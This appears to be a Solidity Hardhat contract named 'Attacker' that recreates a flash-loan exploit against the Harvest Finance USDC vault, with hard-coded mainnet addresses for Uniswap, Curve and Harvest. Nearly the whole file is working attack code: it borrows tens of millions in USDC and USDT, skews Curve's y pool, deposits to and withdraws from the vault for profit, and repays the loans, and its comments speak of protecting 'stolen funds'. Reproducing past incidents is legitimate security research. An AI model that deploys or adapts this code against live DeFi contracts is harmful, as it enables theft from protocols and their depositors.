//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "../interfaces/IUniswapV2Pair.sol";
import "../interfaces/IcurveYSwap.sol";
import "../interfaces/IERC20.sol";
import "../interfaces/IERC20USDT.sol";
import "../interfaces/IHarvestVault.sol";
import "hardhat/console.sol";

contract Attacker {
    // CONTRACTS
    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair usdcPair =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair usdtPair =
        IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    // Curve y swap
    IcurveYSwap curveYSwap =
        IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    // Harvest USDC pool
    IHarvestVault harvest =
        IHarvestVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // ERC20s
    // 6 decimals on usdt
    IERC20USDT usdt = IERC20USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // 6 decimals on usdc
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // 6 decimals on yusdc
    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    // 6 decimals on yusdt
    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    // 6 decimals on fUSDT
    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    // 6 decimals on fUSDC
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    uint256 usdcLoan = 50000000 * 10**6;
    uint256 usdcRepayment = (usdcLoan * 100301) / 100000;
    uint256 usdtLoan = 17300000 * 10**6;
    uint256 usdtRepayment = (usdtLoan * 100301) / 100000;
    uint256 usdcBal;
    uint256 usdtBal;

    // What has to happen:
    // 1. Need to flashloan 18M USDT and 50M USDC from Uni.
    // 2. Convert 17.2M USDT to USDC in the y swap pool, which increases the value of
    //    USDC in the ypool.
    // 3. Deposit 49M into Harvest USDC vault for fUSDC.
    // 4. Exchange the USDC from #2 back to USDT in the yPool.
    // 5. Withdraw fUSDC from Harvest USDC vault, effectively the reverse of #3.
    // 6. This was done 17 times in the same transaction.
    // 7. They then did a similar pattern, in another transaction, against the USDT vault

    // How this will be done:
    // 1. Take out two uniswap loans, which will call uniswapV2Call twice.
    // 2. Have one of the calls (i.e. have one pair's) send that off to undertake the swaps.
    // 3. Leave the other request to refund it's amount when #2 is done.

    constructor() payable {}

    function run() public {
        usdt.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(harvest), type(uint256).max);
        usdt.approve(address(usdtPair), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);

        balanceCheck("Starting balances");
        // #1, part 1: flashloan the USDC which returns into uniswapV2Call
        usdcPair.swap(usdcLoan, 0, address(this), "0x");
        // ^^ from here down the rabbit hole in uniswapV2Call

        console.log("Back from first uniswapV2Call");
        // ^^ at this point we are back from our adventure:
        balanceCheck("Profits");
        // remove this to protect the stolen funds:
        // ideally swap all of this to DAI too.
        usdc.approve(address(usdcPair), 0);
        usdt.approve(address(usdtPair), 0);
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        // the first entry: now request the second loan:
        if (msg.sender == address(usdcPair)) {
            balanceCheck("USDC loan");
            // #1, part two: flashloan the USDT which returns into uniswapV2Call again, but below
            usdtPair.swap(0, usdtLoan, address(this), "0x");

            console.log("Back from second uniswapV2Call");
            // once back from the second loan, repay the first:
            bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
            console.log("USDC repaid");
        }

        // the second entry: here we get to arrrbin.
        if (msg.sender == address(usdtPair)) {
            balanceCheck("USDT loan");
            // Some tracking
            console.log("------------------------");
            console.log("Need to repay");
            console.log("USDC: ", usdcRepayment / 10**6);
            console.log("USDT: ", usdtRepayment / 10**6);

            console.log("------------------------");
            console.log("START EXPLOIT");
            theSwap(0);
            // for (uint256 i = 0; i < 6; i++) {
            //     theSwap(i);
            // }

            console.log("------------------------");
            console.log("PAY OFF DEBTS");
            usdt.transfer(msg.sender, usdtRepayment);
            console.log("USDT repaid");
        }
    }

    function theSwap(uint256 i) internal {
        console.log("SWAP RUN *********** ", i + 1);

        // #2, swap usdt into the yPool for USDC
        curveYSwap.exchange_underlying(
            2,
            1,
            17200000 * 10**6,
            17000000 * 10**6
        );
        // balanceCheck("Post curveYSwap");

        // #3, Deposit 49M into Harvest USDC vault for fUSDC
        harvest.deposit(49000000000000);
        // balanceCheck("Post harvest deposit");

        // #4, exchange usdc from #2 back into ypool for usdt:
        curveYSwap.exchange_underlying(
            1,
            2,
            17310000 * 10**6,
            17000000 * 10**6
        );
        //balanceCheck("Post curveYSwap #2");

        // #5, Withdraw USDC from harvest by cashing in their fUSDC tokens
        harvest.withdraw(fusdc.balanceOf(address(this)));
        // balanceCheck("Post harvest withdrawl");
    }

    function balanceCheck(string memory title) internal {
        console.log("------------------------");
        console.log(title);
        usdcBal = usdc.balanceOf(address(this));
        usdtBal = usdt.balanceOf(address(this));
        console.log("USDC: ", usdcBal / 10**6);
        console.log("USDT: ", usdtBal / 10**6);
    }

    receive() external payable {}
}
